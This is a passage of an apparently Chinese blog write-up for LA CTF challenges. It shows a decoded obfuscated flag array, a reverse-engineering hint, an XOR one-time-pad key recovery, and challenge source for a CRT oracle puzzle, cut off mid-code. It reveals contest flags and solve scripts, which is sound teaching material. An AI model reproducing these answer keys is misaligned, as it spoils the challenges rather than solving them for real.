<br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]<br></code></pre></td></tr></table></figure>
+<p><img src="/mdimg/lactf/12.png" srcset="/img/loading.gif" lazyload><br>转一下就是flag<br><code>lactf&#123;th3_hungry_l1ttl3_c4t3rp1ll4r_at3_th3_fl4g_4g41n&#125;</code></p>
+<h3 id="string-cheese"><a href="#string-cheese" class="headerlink" title="string-cheese"></a>string-cheese</h3><h4 id="题目说明-7"><a href="#题目说明-7" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：一眼顶针的题 比赛的时候没看tnnd<br><img src="/mdimg/lactf/13.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/lactf/14.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="one-more-time-pad"><a href="#one-more-time-pad" class="headerlink" title="one-more-time-pad"></a><strong>one-more-time-pad</strong></h3><h4 id="题目说明-8"><a href="#题目说明-8" class="headerlink" title="题目说明"></a>题目说明</h4><p>I heard the onetime pad is perfectly secure so I used it to send an important message to a friend, but now a UCLA competition is asking for the key? I threw that out a long time ago! Can you help me recover it?</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> cycle<br>pt = <span class="hljs-string">b&quot;Long ago, the four nations lived together in harmony ...&quot;</span><br><br>key = cycle(<span class="hljs-string">b&quot;lactf&#123;??????????????&#125;&quot;</span>)<br><br>ct = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(pt)):<br>    b = (pt[i] ^ <span class="hljs-built_in">next</span>(key))<br>    ct += <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;b:02x&#125;</span>&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ct =&quot;</span>, ct)<br><br><span class="hljs-comment">#ct = 200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e</span><br></code></pre></td></tr></table></figure>
+<h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p>异或一下就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br>pt = <span class="hljs-string">b&quot;Long ago, the four nations lived together in harmony ...&quot;</span><br>ct = <span class="hljs-number">0x200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e</span><br>ct=long_to_bytes(<span class="hljs-built_in">int</span>(ct))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ct)):<br>    flag = (pt[i] ^ ct[i])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#lactf&#123;b4by_h1t_m3_0ne_m0r3_t1m3&#125;</span><br></code></pre></td></tr></table></figure>
+<h3 id="chinese-lazy-theorem-1"><a href="#chinese-lazy-theorem-1" class="headerlink" title="chinese-lazy-theorem-1"></a>chinese-lazy-theorem-1</h3><h4 id="题目说明-9"><a href="#题目说明-9" class="headerlink" title="题目说明"></a>题目说明</h4><p>I heard about this cool theorem called the Chinese Remainder Theorem, but, uh… I’m feeling kinda tired right now.<br><code>nc lac.tf 31110</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> Crypto.Random.random <span class="hljs-keyword">import</span> randint<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br><br>target = randint(<span class="hljs-number">1</span>, n)<br><br>used_oracle = <span class="hljs-literal">False</span><br><br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(q)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;To quote Pete Bancini, \&quot;I&#x27;m tired.\&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I&#x27;ll answer one modulus question, that&#x27;s it.&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;What do you want?&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1: Ask for a modulus&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2: Guess my number&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3: Exit&quot;</span>)<br>    response = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br><br>    <span class="hljs-keyword">if</span> response == <span class="hljs-string">&quot;1&quot;</span>:<br>        <span class="hljs-keyword">if</span> used_oracle:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;too lazy&quot;</span>)<br>            <span class="hljs-built_in">print</span>()<br>        <span class="hljs-keyword">else</span>:<br>            modulus = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your modulus here: &quot;</span>)<br>            modulus = <span class="hljs-built_in">int</span>(modulus)<br>            <span class="hljs-keyword">if</span> modulus &lt;= <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;something positive pls&quot;</span>)<br>                <span class="hljs-built_in">print</span>()<br>            <span class="hljs-keyword">else</span>:<br>                used_oracle = <span class="hljs-literal">True</span><br>                <span class="hljs-built_in">print</span>(target%modulus)<br>                <span class="hljs-built_in">print</span>()<br>    <span class="hljs-keyword">elif</span> response == <span class="hljs-string">&quot;2&quot;</span>:<br>        guess = <span class="hljs-built_in">input</span>(<span 